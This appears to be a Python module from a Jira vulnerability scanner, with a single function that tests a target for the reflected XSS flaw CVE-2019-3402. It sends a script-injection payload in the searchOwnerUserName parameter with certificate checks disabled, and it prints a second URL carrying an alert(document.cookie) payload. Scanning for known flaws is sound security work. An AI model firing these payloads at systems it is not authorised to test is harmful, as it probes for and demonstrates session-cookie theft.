import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import json
from urllib.parse import urlparse
import urllib3

def check_cve_2019_3402(base_url):
    """
    Checks for XSS in the ConfigurePortalPages.jspa resource - CVE-2019-3402
    """
    print(f"\n{Fore.YELLOW}INFO: Checking for CVE-2019-3402 (XSS){Style.RESET_ALL}")
    
    vulnerabilities = ''  # Initialize a string to store discovered vulnerabilities

    try:
        # Construct the target URL with the XSS payload
        check_cve_2019_3402_url = (
            f"{base_url.rstrip('/')}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS_TEST\")%3C%2fscript%3Et1nmk&Search=Search")
        manual_cve_2019_3402_url = (
            f"{base_url.rstrip('/')}/secure/ConfigurePortalPages!default.jspa?"
            f"view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(document.cookie)%3C%2fscript%3Et1nmk&Search=Search"
        )
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {check_cve_2019_3402_url}")

        # Send the request
        response = requests.get(check_cve_2019_3402_url, allow_redirects=False, verify=False)

        # Check for the XSS payload in the response
        if "XSS_TEST" in response.text:
            vulnerability_detail = f"+ [XSS] Vulnerable to CVE-2019-3402: {check_cve_2019_3402_url}"
            vulnerabilities += vulnerability_detail
            print(f"{Fore.GREEN}[+] [XSS] Vulnerable to CVE-2019-3402: {check_cve_2019_3402_url}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] URL: {manual_cve_2019_3402_url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[-] Not Vulnerable to CVE-2019-3402{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}* An error occurred while checking {base_url}: {e}{Style.RESET_ALL}")

    return vulnerabilities  # Return the discovered vulnerabilities
